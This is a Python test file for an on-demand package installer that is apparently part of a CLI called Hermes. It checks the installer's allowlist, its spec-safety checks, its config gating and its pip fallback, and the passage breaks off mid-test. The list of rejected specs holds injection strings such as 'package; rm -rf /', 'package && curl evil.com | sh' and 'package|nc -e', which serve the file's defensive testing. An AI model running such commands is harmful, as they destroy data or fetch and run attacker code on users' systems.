"""Tests for tools.lazy_deps — the supply-chain-resilient on-demand installer.

The lazy_deps module is the architectural fix for the "one quarantined
package nukes 10 unrelated extras" problem. It exposes ``ensure(feature)``
which only installs from a strict allowlist, refuses anything that looks
like a URL / file path, runs venv-scoped, and respects the
``security.allow_lazy_installs`` config flag.

These tests cover the security boundary and the public API. The real pip
call is mocked — we never actually shell out during unit tests.
"""

from __future__ import annotations


import pytest

import tools.lazy_deps as ld


# ---------------------------------------------------------------------------
# Spec safety
# ---------------------------------------------------------------------------


class TestSpecSafety:
    @pytest.mark.parametrize("spec", [
        "mistralai>=2.3.0,<3",
        "elevenlabs>=1.0,<2",
        "honcho-ai>=2.0.1,<3",
        "boto3>=1.35.0,<2",
        "mautrix[encryption]>=0.20,<1",
        "google-api-python-client>=2.100,<3",
        "youtube-transcript-api>=1.2.0",
        "qrcode>=7.0,<8",
        "package",  # bare name, no version
        "package==1.0.0",
        "package~=1.0",
    ])
    def test_safe_specs_pass(self, spec):
        assert ld._spec_is_safe(spec), f"expected {spec!r} to be safe"

    @pytest.mark.parametrize("spec", [
        # URL-shaped → rejected (no remote origin override allowed)
        "git+https://github.com/foo/bar.git",
        "https://example.com/foo.tar.gz",
        # File path → rejected
        "/etc/passwd",
        "./local-malware",
        "../escape",
        # Shell metacharacters → rejected
        "package; rm -rf /",
        "package && curl evil.com | sh",
        "package`whoami`",
        "package$(whoami)",
        "package|nc -e",
        # Pip flag injection → rejected
        "--index-url=http://evil/",
        "-r requirements.txt",
        # Whitespace control chars → rejected
        "package\nshell-injection",
        "package\rmore",
        # Empty / overly long → rejected
        "",
        "x" * 500,
    ])
    def test_unsafe_specs_rejected(self, spec):
        assert not ld._spec_is_safe(spec), \
            f"expected {spec!r} to be rejected"


# ---------------------------------------------------------------------------
# Allowlist enforcement
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_unknown_feature_raises(self, monkeypatch):
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        with pytest.raises(ld.FeatureUnavailable, match="not in LAZY_DEPS"):
            ld.ensure("not.a.real.feature")

    def test_lazy_deps_keys_use_namespace_dot_name(self):
        # Sanity check on the data shape — every key should be at least
        # one dot-separated namespace.
        for key in ld.LAZY_DEPS:
            assert "." in key, f"feature {key!r} should be namespace.name"

    def test_every_lazy_dep_spec_passes_safety(self):
        # Defence in depth — even though specs are author-controlled,
        # the safety regex must accept everything we ship.
        for feature, specs in ld.LAZY_DEPS.items():
            for spec in specs:
                assert ld._spec_is_safe(spec), \
                    f"{feature}: spec {spec!r} fails safety check"

    def test_feature_install_command_returns_pip_invocation(self):
        cmd = ld.feature_install_command("memory.honcho")
        assert cmd is not None
        assert cmd.startswith("uv pip install")
        assert "honcho-ai" in cmd

    def test_feature_install_command_unknown(self):
        assert ld.feature_install_command("not.real") is None


# ---------------------------------------------------------------------------
# allow_lazy_installs gating
# ---------------------------------------------------------------------------


class TestSecurityGating:
    def test_disabled_via_config_raises(self, monkeypatch):
        # Pretend honcho is missing AND lazy installs are disabled.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("packageX>=1.0,<2",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        with pytest.raises(ld.FeatureUnavailable, match="lazy installs disabled"):
            ld.ensure("test.feat", prompt=False)

    def test_disabled_via_env_var(self, monkeypatch):
        monkeypatch.setenv("HERMES_DISABLE_LAZY_INSTALLS", "1")
        # Bypass config layer; the env var alone must disable.
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: {"security": {"allow_lazy_installs": True}},
        )
        assert ld._allow_lazy_installs() is False

    def test_default_allows(self, monkeypatch):
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: {"security": {}},
        )
        assert ld._allow_lazy_installs() is True

    def test_config_failure_fails_open(self, monkeypatch):
        # If config can't be read at all, we ALLOW installs rather than
        # blocking the user out of their own backends.
        monkeypatch.delenv("HERMES_DISABLE_LAZY_INSTALLS", raising=False)
        monkeypatch.setattr(
            "hermes_cli.config.load_config",
            lambda: (_ for _ in ()).throw(RuntimeError("config broken")),
        )
        assert ld._allow_lazy_installs() is True


# ---------------------------------------------------------------------------
# ensure() happy/sad paths
# ---------------------------------------------------------------------------


class TestEnsure:
    def test_already_satisfied_is_noop(self, monkeypatch):
        # If the package is importable, ensure() returns without calling pip.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.satisfied", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # If pip were called, this would fail loudly.
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        ld.ensure("test.satisfied", prompt=False)  # no exception

    def test_install_success_path(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.install", ("zzzfake>=1",))
        # First check sees missing, post-install check sees installed.
        call_count = {"n": 0}

        def fake_satisfied(spec):
            call_count["n"] += 1
            return call_count["n"] > 1  # missing first, installed after

        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        ld.ensure("test.install", prompt=False)

    def test_install_failure_surfaces_pip_stderr(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.fail", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(
                False, "", "ERROR: package not found on PyPI"
            ),
        )
        with pytest.raises(ld.FeatureUnavailable, match="pip install failed"):
            ld.ensure("test.fail", prompt=False)

    def test_install_succeeds_but_still_missing_raises(self, monkeypatch):
        # Pip says success but the package still isn't importable
        # (e.g. site-packages caching, wrong python). Surface this.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.cache", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        with pytest.raises(ld.FeatureUnavailable, match="still not importable"):
            ld.ensure("test.cache", prompt=False)


# ---------------------------------------------------------------------------
# is_available
# ---------------------------------------------------------------------------


class TestIsAvailable:
    def test_unknown_feature_returns_false(self):
        assert ld.is_available("not.a.thing") is False

    def test_satisfied_returns_true(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.avail", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        assert ld.is_available("test.avail") is True

    def test_missing_returns_false(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.miss", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        assert ld.is_available("test.miss") is False


# ---------------------------------------------------------------------------
# Version-aware _is_satisfied (Piece B — "stale pin" detection)
#
# The original implementation returned True the moment the package name
# was importable, ignoring the spec's version range. That meant pin bumps
# in LAZY_DEPS never propagated to users who already lazy-installed the
# backend at an older version. _is_satisfied now parses the spec and
# checks the installed version against the constraint.
# ---------------------------------------------------------------------------


class TestIsSatisfiedVersionAware:
    def _fake_version(self, monkeypatch, installed_versions: dict):
        """Patch importlib.metadata.version() inside lazy_deps."""
        from importlib.metadata import PackageNotFoundError

        def _version(pkg):
            if pkg in installed_versions:
                return installed_versions[pkg]
            raise PackageNotFoundError(pkg)

        # Patch at the import site lazy_deps uses (inside the function).
        import importlib.metadata as _md
        monkeypatch.setattr(_md, "version", _version)

    def test_exact_pin_match_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"honcho-ai": "2.0.1"})
        assert ld._is_satisfied("honcho-ai==2.0.1") is True

    def test_exact_pin_mismatch_returns_false(self, monkeypatch):
        # Installed 2.0.0, spec requires 2.0.1 → False (needs upgrade).
        self._fake_version(monkeypatch, {"honcho-ai": "2.0.0"})
        assert ld._is_satisfied("honcho-ai==2.0.1") is False

    def test_range_within_returns_true(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.27.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is True

    def test_range_above_returns_false(self, monkeypatch):
        # Installed too new for the upper bound.
        self._fake_version(monkeypatch, {"slack-bolt": "2.0.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is False

    def test_range_below_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"slack-bolt": "1.0.0"})
        assert ld._is_satisfied("slack-bolt>=1.18.0,<2") is False

    def test_package_not_installed_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {})
        assert ld._is_satisfied("anthropic==0.86.0") is False

    def test_bare_package_name_presence_is_enough(self, monkeypatch):
        # No version constraint — presence alone counts as satisfied.
        self._fake_version(monkeypatch, {"somepkg": "1.0.0"})
        assert ld._is_satisfied("somepkg") is True

    def test_extras_block_in_spec_is_stripped(self, monkeypatch):
        # mautrix[encryption]==0.21.0 — the [encryption] block must not
        # confuse the specifier parser.
        self._fake_version(monkeypatch, {"mautrix": "0.21.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is True

    def test_extras_block_mismatch_returns_false(self, monkeypatch):
        self._fake_version(monkeypatch, {"mautrix": "0.20.0"})
        assert ld._is_satisfied("mautrix[encryption]==0.21.0") is False


# ---------------------------------------------------------------------------
# active_features + refresh_active_features (Piece A — hermes update wiring)
# ---------------------------------------------------------------------------


class TestActiveFeatures:
    def test_no_packages_installed_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "_is_present", lambda spec: False)
        assert ld.active_features() == []

    def test_finds_features_with_at_least_one_package_installed(self, monkeypatch):
        # Pretend only honcho-ai is installed; nothing else.
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "honcho-ai",
        )
        active = ld.active_features()
        assert "memory.honcho" in active
        # Backends the user never enabled stay quiet.
        assert "memory.hindsight" not in active
        assert "platform.slack" not in active

    def test_multi_package_feature_active_if_any_present(self, monkeypatch):
        # platform.slack has 3 packages; only one needs to be present
        # for the feature to count as active (user activated it before,
        # one transitive may have been uninstalled separately).
        monkeypatch.setattr(
            ld, "_is_present",
            lambda spec: ld._pkg_name_from_spec(spec) == "slack-bolt",
        )
        assert "platform.slack" in ld.active_features()


class TestRefreshActiveFeatures:
    def test_no_active_features_returns_empty(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: [])
        assert ld.refresh_active_features() == {}

    def test_windows_matrix_refresh_is_skipped_before_pip(self, monkeypatch):
        # Matrix E2EE pulls python-olm, which has no native Windows wheel/build
        # path. `hermes update` must not retry that doomed install every run.
        monkeypatch.setattr(ld.sys, "platform", "win32")
        monkeypatch.setattr(ld, "active_features", lambda: ["platform.matrix"])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
        )

        result = ld.refresh_active_features()

        assert result["platform.matrix"].startswith("skipped:")
        assert "unsupported on Windows" in result["platform.matrix"]

    def test_windows_matrix_ensure_fails_before_pip(self, monkeypatch):
        monkeypatch.setattr(ld.sys, "platform", "win32")
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called for unsupported Matrix on Windows"),
        )

        with pytest.raises(ld.FeatureUnavailable, match="unsupported on Windows"):
            ld.ensure("platform.matrix", prompt=False)

    def test_windows_matrix_already_satisfied_still_works(self, monkeypatch):
        # Do not break users who already have a working Matrix dependency set;
        # only the impossible Windows install/refresh path should be blocked.
        monkeypatch.setattr(ld.sys, "platform", "win32")
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        monkeypatch.setattr(
            ld,
            "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called when Matrix deps are current"),
        )

        ld.ensure("platform.matrix", prompt=False)

    def test_already_current_is_noop(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==1.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # If pip were called, this would fail loudly.
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called"),
        )
        result = ld.refresh_active_features()
        assert result == {"test.feat": "current"}

    def test_stale_pin_triggers_reinstall(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        # First _is_satisfied check (in feature_missing) says no; after
        # install, post-install check says yes.
        states = iter([False, True])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: next(states))
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        result = ld.refresh_active_features()
        assert result == {"test.feat": "refreshed"}

    def test_install_failure_recorded_not_raised(self, monkeypatch):
        # A failed refresh must NOT raise out of hermes update.
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(
                False, "", "ERROR: PyPI 404 quarantine"
            ),
        )
        result = ld.refresh_active_features()
        assert "test.feat" in result
        assert result["test.feat"].startswith("failed:")
        assert "404 quarantine" in result["test.feat"]

    def test_lazy_installs_disabled_marked_skipped(self, monkeypatch):
        # security.allow_lazy_installs=false → don't error, mark skipped
        # so hermes update can render "respecting your config" message.
        monkeypatch.setattr(ld, "active_features", lambda: ["test.feat"])
        monkeypatch.setitem(ld.LAZY_DEPS, "test.feat", ("zzzfake==2.0.0",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: False)
        result = ld.refresh_active_features()
        assert "test.feat" in result
        assert result["test.feat"].startswith("skipped:")

    def test_mixed_results_returns_per_feature_status(self, monkeypatch):
        monkeypatch.setattr(ld, "active_features", lambda: ["a.ok", "b.fail"])
        monkeypatch.setitem(ld.LAZY_DEPS, "a.ok", ("pkga==1.0",))
        monkeypatch.setitem(ld.LAZY_DEPS, "b.fail", ("pkgb==1.0",))
        # a.ok: already satisfied → "current"
        # b.fail: missing + install fails → "failed:"
        def fake_satisfied(spec):
            return ld._pkg_name_from_spec(spec) == "pkga"
        monkeypatch.setattr(ld, "_is_satisfied", fake_satisfied)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(False, "", "nope"),
        )
        result = ld.refresh_active_features()
        assert result["a.ok"] == "current"
        assert result["b.fail"].startswith("failed:")


# ---------------------------------------------------------------------------
# _specifier_from_spec edge cases
# ---------------------------------------------------------------------------


class TestSpecifierFromSpec:
    def test_extracts_version_specifier(self):
        assert ld._specifier_from_spec("honcho-ai==2.0.1") == "==2.0.1"

    def test_extracts_range(self):
        assert ld._specifier_from_spec("slack-bolt>=1.18.0,<2") == ">=1.18.0,<2"

    def test_strips_extras_block(self):
        assert ld._specifier_from_spec("mautrix[encryption]>=0.20,<1") == ">=0.20,<1"

    def test_bare_package_returns_empty(self):
        assert ld._specifier_from_spec("somepkg") == ""

    def test_no_match_returns_empty(self):
        # First char invalid → regex doesn't match → empty string.
        assert ld._specifier_from_spec("==1.0") == ""


# ---------------------------------------------------------------------------
# _is_satisfied fallback branches
# ---------------------------------------------------------------------------


class TestIsSatisfiedFallbacks:
    def test_importlib_metadata_import_error_returns_false(self, monkeypatch):
        # importlib.metadata is always present on 3.8+, but the branch
        # exists for defence. Simulate by making the import raise.
        import builtins

        real_import = builtins.__import__

        def fake_import(name, *args, **kwargs):
            if name == "importlib.metadata":
                raise ImportError("blocked for test")
            return real_import(name, *args, **kwargs)

        monkeypatch.setattr(builtins, "__import__", fake_import)
        assert ld._is_satisfied("any-pkg==1.0") is False

    def test_version_raises_generic_exception_returns_false(self, monkeypatch):
        import importlib.metadata as _md

        def _raise(pkg):
            raise RuntimeError("metadata DB corrupted")

        monkeypatch.setattr(_md, "version", _raise)
        assert ld._is_satisfied("any-pkg==1.0") is False

    def test_packaging_unavailable_returns_true(self, monkeypatch):
        # packaging import fails → fall back to "installed counts as satisfied".
        import importlib.metadata as _md

        monkeypatch.setattr(_md, "version", lambda pkg: "1.0.0")

        import builtins
        real_import = builtins.__import__

        def fake_import(name, *args, **kwargs):
            if name == "packaging.specifiers":
                raise ImportError("packaging not installed")
            return real_import(name, *args, **kwargs)

        monkeypatch.setattr(builtins, "__import__", fake_import)
        assert ld._is_satisfied("any-pkg==2.0.0") is True

    def test_invalid_specifier_returns_true(self, monkeypatch):
        # Malformed spec tail → don't churn, treat as satisfied.
        import importlib.metadata as _md

        monkeypatch.setattr(_md, "version", lambda pkg: "1.0.0")
        # Inject a spec whose tail parses but the installed version is
        # unparseable. We patch Version to raise InvalidVersion.
        from packaging.version import InvalidVersion

        import packaging.version as pv

        def _bad_version(s):
            raise InvalidVersion(f"unparseable: {s}")

        monkeypatch.setattr(pv, "Version", _bad_version)
        assert ld._is_satisfied("any-pkg==1.0.0") is True


# ---------------------------------------------------------------------------
# _is_present all branches
# ---------------------------------------------------------------------------


class TestIsPresent:
    def test_present_returns_true(self, monkeypatch):
        import importlib.metadata as _md

        monkeypatch.setattr(_md, "version", lambda pkg: "1.0.0")
        assert ld._is_present("any-pkg") is True

    def test_not_found_returns_false(self, monkeypatch):
        from importlib.metadata import PackageNotFoundError
        import importlib.metadata as _md

        def _raise(pkg):
            raise PackageNotFoundError(pkg)

        monkeypatch.setattr(_md, "version", _raise)
        assert ld._is_present("any-pkg") is False

    def test_generic_exception_returns_false(self, monkeypatch):
        import importlib.metadata as _md

        def _raise(pkg):
            raise RuntimeError("boom")

        monkeypatch.setattr(_md, "version", _raise)
        assert ld._is_present("any-pkg") is False

    def test_importlib_metadata_import_error_returns_false(self, monkeypatch):
        import builtins

        real_import = builtins.__import__

        def fake_import(name, *args, **kwargs):
            if name == "importlib.metadata":
                raise ImportError("blocked for test")
            return real_import(name, *args, **kwargs)

        monkeypatch.setattr(builtins, "__import__", fake_import)
        assert ld._is_present("any-pkg") is False


# ---------------------------------------------------------------------------
# _venv_pip_install — all tiers
# ---------------------------------------------------------------------------


class TestVenvPipInstall:
    def test_empty_specs_is_noop_success(self):
        result = ld._venv_pip_install(())
        assert result.success is True
        assert result.stdout == ""
        assert result.stderr == ""

    def test_uv_success(self, monkeypatch):
        from types import SimpleNamespace

        monkeypatch.setattr("shutil.which", lambda name: "/fake/uv")
        monkeypatch.setattr(
            "subprocess.run",
            lambda *a, **kw: SimpleNamespace(returncode=0, stdout="ok", stderr=""),
        )
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is True
        assert result.stdout == "ok"

    def test_uv_fail_falls_back_to_pip(self, monkeypatch):
        from types import SimpleNamespace

        calls = []

        def fake_run(cmd, **kw):
            calls.append(list(cmd))
            if cmd[0] == "/fake/uv":
                return SimpleNamespace(returncode=1, stdout="", stderr="uv fail")
            if "--version" in cmd:
                return SimpleNamespace(returncode=0, stdout="pip 24.0", stderr="")
            return SimpleNamespace(returncode=0, stdout="pip ok", stderr="")

        monkeypatch.setattr("shutil.which", lambda name: "/fake/uv")
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is True
        assert result.stdout == "pip ok"

    def test_uv_timeout_falls_back_to_pip(self, monkeypatch):
        import subprocess
        from types import SimpleNamespace

        def fake_run(cmd, **kw):
            if cmd[0] == "/fake/uv":
                raise subprocess.TimeoutExpired(cmd=cmd, timeout=300)
            if "--version" in cmd:
                return SimpleNamespace(returncode=0, stdout="pip 24.0", stderr="")
            return SimpleNamespace(returncode=0, stdout="pip ok", stderr="")

        monkeypatch.setattr("shutil.which", lambda name: "/fake/uv")
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is True

    def test_uv_not_found_uses_pip(self, monkeypatch):
        from types import SimpleNamespace

        def fake_run(cmd, **kw):
            if "--version" in cmd:
                return SimpleNamespace(returncode=0, stdout="pip 24.0", stderr="")
            return SimpleNamespace(returncode=0, stdout="pip ok", stderr="")

        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is True

    def test_pip_probe_fails_ensurepip_bootstraps(self, monkeypatch):
        import subprocess
        from types import SimpleNamespace

        def fake_run(cmd, **kw):
            if "--version" in cmd:
                return SimpleNamespace(returncode=1, stdout="", stderr="no pip")
            if "ensurepip" in cmd:
                return SimpleNamespace(returncode=0, stdout="", stderr="")
            return SimpleNamespace(returncode=0, stdout="pip ok", stderr="")

        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is True

    def test_pip_probe_timeout_ensurepip_bootstraps(self, monkeypatch):
        import subprocess
        from types import SimpleNamespace

        def fake_run(cmd, **kw):
            if "--version" in cmd:
                raise subprocess.TimeoutExpired(cmd=cmd, timeout=15)
            if "ensurepip" in cmd:
                return SimpleNamespace(returncode=0, stdout="", stderr="")
            return SimpleNamespace(returncode=0, stdout="pip ok", stderr="")

        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is True

    def test_ensurepip_fails_returns_error(self, monkeypatch):
        import subprocess
        from types import SimpleNamespace

        def fake_run(cmd, **kw):
            if "--version" in cmd:
                return SimpleNamespace(returncode=1, stdout="", stderr="no pip")
            if "ensurepip" in cmd:
                raise subprocess.CalledProcessError(1, cmd, stderr="ensurepip fail")
            return SimpleNamespace(returncode=0, stdout="", stderr="")

        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is False
        assert "ensurepip failed" in result.stderr

    def test_ensurepip_timeout_returns_error(self, monkeypatch):
        import subprocess
        from types import SimpleNamespace

        def fake_run(cmd, **kw):
            if "--version" in cmd:
                return SimpleNamespace(returncode=1, stdout="", stderr="no pip")
            if "ensurepip" in cmd:
                raise subprocess.TimeoutExpired(cmd=cmd, timeout=120)
            return SimpleNamespace(returncode=0, stdout="", stderr="")

        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is False
        assert "ensurepip failed" in result.stderr

    def test_pip_install_failure_returns_error(self, monkeypatch):
        from types import SimpleNamespace

        def fake_run(cmd, **kw):
            if "--version" in cmd:
                return SimpleNamespace(returncode=0, stdout="pip 24.0", stderr="")
            return SimpleNamespace(returncode=1, stdout="", stderr="pip fail")

        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is False
        assert result.stderr == "pip fail"

    def test_pip_install_timeout_returns_error(self, monkeypatch):
        import subprocess
        from types import SimpleNamespace

        def fake_run(cmd, **kw):
            if "--version" in cmd:
                return SimpleNamespace(returncode=0, stdout="pip 24.0", stderr="")
            raise subprocess.TimeoutExpired(cmd=cmd, timeout=300)

        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is False
        assert "timed out" in result.stderr

    def test_pip_install_generic_exception_returns_error(self, monkeypatch):
        from types import SimpleNamespace

        def fake_run(cmd, **kw):
            if "--version" in cmd:
                return SimpleNamespace(returncode=0, stdout="pip 24.0", stderr="")
            raise OSError("disk full")

        monkeypatch.setattr("shutil.which", lambda name: None)
        monkeypatch.setattr("subprocess.run", fake_run)
        result = ld._venv_pip_install(("pkg==1.0",))
        assert result.success is False
        assert "pip install failed" in result.stderr


# ---------------------------------------------------------------------------
# feature_specs KeyError
# ---------------------------------------------------------------------------


class TestFeatureSpecs:
    def test_unknown_feature_raises_keyerror(self):
        with pytest.raises(KeyError, match="Unknown lazy feature"):
            ld.feature_specs("not.a.real.feature")

    def test_known_feature_returns_specs(self):
        specs = ld.feature_specs("memory.honcho")
        assert specs == ld.LAZY_DEPS["memory.honcho"]


# ---------------------------------------------------------------------------
# ensure() unsafe-spec guard + prompt paths
# ---------------------------------------------------------------------------


class TestEnsureEdgeCases:
    def test_unsafe_spec_raises(self, monkeypatch):
        # Inject a spec that fails the safety regex into a registered feature.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.unsafe", ("git+https://evil/",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        with pytest.raises(ld.FeatureUnavailable, match="unsafe spec"):
            ld.ensure("test.unsafe", prompt=False)

    def test_prompt_yes_installs(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.prompt", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: True)
        # _is_satisfied True → no install needed, prompt never reached.
        # To exercise the prompt yes-path we need missing→install→satisfied.
        states = iter([False, True])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: next(states))
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )
        monkeypatch.setattr("sys.stdin", type("S", (), {"isatty": lambda self: True})())
        monkeypatch.setattr("sys.stdout", type("S", (), {"isatty": lambda self: True})())
        monkeypatch.setattr("builtins.input", lambda *a, **kw: "y")
        ld.ensure("test.prompt", prompt=True)

    def test_prompt_no_declines(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.decline", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called on decline"),
        )
        monkeypatch.setattr("sys.stdin", type("S", (), {"isatty": lambda self: True})())
        monkeypatch.setattr("sys.stdout", type("S", (), {"isatty": lambda self: True})())
        monkeypatch.setattr("builtins.input", lambda *a, **kw: "n")
        with pytest.raises(ld.FeatureUnavailable, match="user declined"):
            ld.ensure("test.decline", prompt=True)

    def test_prompt_eof_declines(self, monkeypatch):
        monkeypatch.setitem(ld.LAZY_DEPS, "test.eof", ("zzzfake>=1",))
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: False)
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda *a, **kw: pytest.fail("pip should not be called on EOF"),
        )
        monkeypatch.setattr("sys.stdin", type("S", (), {"isatty": lambda self: True})())
        monkeypatch.setattr("sys.stdout", type("S", (), {"isatty": lambda self: True})())

        def _raise_eof(*a, **kw):
            raise EOFError()

        monkeypatch.setattr("builtins.input", _raise_eof)
        with pytest.raises(ld.FeatureUnavailable, match="user declined"):
            ld.ensure("test.eof", prompt=True)

    def test_prompt_skipped_when_prompt_toolkit_active(self, monkeypatch):
        # When prompt_toolkit application is running, the input() prompt
        # is skipped (would deadlock). Install proceeds without prompting.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.pt", ("zzzfake>=1",))
        states = iter([False, True])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: next(states))
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
            lambda specs, **kw: ld._InstallResult(True, "ok", ""),
        )

        # Simulate prompt_toolkit being loaded and an app running.
        import sys

        class _FakeApp:
            is_running = True

        class _FakePtModule:
            @staticmethod
            def get_app_or_none():
                return _FakeApp()

        monkeypatch.setitem(
            sys.modules, "prompt_toolkit.application.current", _FakePtModule
        )
        # If the prompt were reached, input() would block. We don't mock
        # input, so reaching it would hang — passing means prompt was skipped.
        ld.ensure("test.pt", prompt=True)

    def test_prompt_toolkit_import_exception_skips_prompt(self, monkeypatch):
        # prompt_toolkit in sys.modules but get_app_or_none raises →
        # _pt_active stays False, but stdin not a tty → prompt still skipped.
        monkeypatch.setitem(ld.LAZY_DEPS, "test.pterr", ("zzzfake>=1",))
        states = iter([False, True])
        monkeypatch.setattr(ld, "_is_satisfied", lambda spec: next(states))
        monkeypatch.setattr(ld, "_allow_lazy_installs", lambda: True)
        monkeypatch.setattr(
            ld, "_venv_pip_install",
